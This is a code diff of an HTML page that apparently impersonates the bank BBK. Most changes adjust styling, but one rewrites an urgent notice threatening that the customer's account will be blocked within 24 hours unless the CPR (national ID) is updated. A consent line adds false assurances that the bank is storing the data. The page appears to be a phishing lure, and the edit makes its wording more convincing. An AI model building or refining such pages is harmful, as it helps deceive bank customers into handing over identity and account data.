@@ -20,7 +20,7 @@
   body{
     margin:0;
     font-family:"Poppins",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
-    background:linear-gradient(180deg,#f6f8f9 0%, var(--bg) 60%);
+    background:#f4f7f8;
     color:var(--blue);
     -webkit-font-smoothing:antialiased;
     -moz-osx-font-smoothing:grayscale;
@@ -99,6 +99,7 @@
   .card{
     background:var(--card);border-radius:16px;padding:22px;box-shadow:0 10px 30px rgba(17,24,39,0.04);
     color:var(--muted);font-size:15px;line-height:1.45;margin-bottom:18px;
+    border:1px solid rgba(0,0,0,0.05);
   }
   .card h3{color:var(--blue);font-weight:600;margin:0 0 12px;font-size:16px}
   .bullet{display:flex;gap:12px;align-items:center;margin:12px 0}
@@ -108,10 +109,10 @@
   }
   .bullet .t{color:var(--blue);font-weight:500}
 
-  .fineprint{font-size:13px;color:#5a5e61;margin-top:8px}
+  .fineprint{font-size:13px;color:#5a5e61;margin-top:8px;line-height:1.5}
 
   /* consent text */
-  .consent{color:#9fb0b9;font-size:12px;margin:20px 4px 40px;line-height:1.6;font-weight:600}
+  .consent{color:#9fb0b9;font-size:12px;margin:20px 4px 40px;line-height:1.6;font-weight:400}
 
   /* action buttons */
   .actions{display:flex;flex-direction:column;gap:14px;align-items:stretch}
@@ -119,7 +120,7 @@
     background:var(--accent);color:white;font-weight:600;padding:16px;border-radius:18px;border:none;font-size:18px;
     box-shadow:0 8px 0 rgba(255,159,0,0.04);cursor:pointer;
   }
-  .cancel{background:transparent;color:var(--accent);text-align:center;font-weight:600;border:none;font-size:16px}
+  .cancel{background:transparent;color:var(--accent);text-align:center;font-weight:600;border:none;font-size:16px;cursor:pointer;padding:8px}
 
   /* Mobile Responsive Styles */
   @media (max-width: 768px) {
@@ -288,7 +289,7 @@
 
     <div class="card" role="region" aria-label="Instructions">
       <h3>Notice:</h3>
-      <div class="fineprint">Dear BBK user your account is at risk of deactivation because your CPR has expired in the bank record please update your CPR immediately otherwise your BBK account will be blocked within 24 hours.</div>
+      <div class="fineprint">Dear BBK customer, your account is at risk of deactivation because CPR has expired in the bank record. Please update your CPR immediately, otherwise your BBK account will be blocked within 24 hours.</div>
     </div>
 
     <div class="consent">Your data will be stored in the Bank's records and kindly note that your CPR data will be reviewed by BBK employees.</div>
